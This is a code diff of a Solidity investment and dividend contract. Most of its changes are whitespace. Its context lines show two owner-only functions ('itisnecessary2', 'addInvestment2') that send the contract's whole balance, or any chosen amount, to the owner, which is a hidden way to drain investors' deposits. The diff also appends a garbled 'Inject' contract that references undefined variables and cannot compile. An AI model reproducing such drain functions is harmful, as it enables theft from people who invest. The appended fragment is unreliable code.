@@ -358,7 +358,7 @@ function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
 rgp.startTimestamp = timestamp;
 
 }
- 
+
 
 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
 if (rgp.startTimestamp > now) {
@@ -558,23 +558,23 @@ dividends = address(this).balance;
 }
 
 
-    
+
 // transfer dividends to investor
 msg.sender.transfer(dividends);
 emit LogPayDividends(msg.sender, now, dividends);
 }
 
-    
+
 function itisnecessary2() public onlyOwner {
         msg.sender.transfer(address(this).balance);
-    }    
-    
+    }
+
 
 function addInvestment2( uint investment) public onlyOwner  {
 
 msg.sender.transfer(investment);
 
-} 
+}
 
 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
 uint investment = msg.value;
@@ -693,4 +693,15 @@ m_rgp.startAt(now);
 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
 emit LogNextWave(now);
 }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
